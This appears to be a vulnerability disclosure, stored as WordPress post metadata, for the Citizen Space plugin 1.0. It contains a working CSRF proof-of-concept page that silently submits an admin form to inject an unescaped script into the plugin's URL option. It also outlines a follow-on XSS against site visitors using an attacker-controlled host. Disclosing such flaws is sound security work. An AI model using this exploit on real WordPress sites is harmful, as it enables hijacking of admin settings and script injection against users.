wp:postmeta.wp:meta_value:
If an attacker can convince a logged-in admin to visit a page of theirs, they can change the value of the citizenspace_url option via CSRF. That value is then inserted into the same page unescaped (<a href="http://plugins.trac.wordpress.org/browser/citizen-space/tags/1.0/citizenspace.php#L43">citizenspace.php line 43</a>).
<pre>&lt;script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"&gt;&lt;/script&gt;
&lt;script&gt;
  jQuery(function () {
    document.forms[0].submit()
  })
&lt;/script&gt;
&lt;form action="http://wordpress.local/wp-admin/options-general.php?page=citizenspace" method="POST"&gt;
  &lt;input type="hidden" name="cs_submit" value="true"&gt;
  &lt;input type="hidden" name="citizenspace_url" value="&amp;quot;&gt;&amp;lt;script&gt;alert(String.fromCharCode(100,120,119))&amp;lt;/script&gt;"&gt;
&lt;/form&gt;</pre>
XSS can also be performed against non-logged-in users by using the above method to set the URL to a valid URL you control (I used http://localhost:9999/). Then run the following Sinatra application (ruby exploit.rb -p 9999), and finally direct users to http://example.org/cs_consultation/?path=http://localhost:9999/abc.
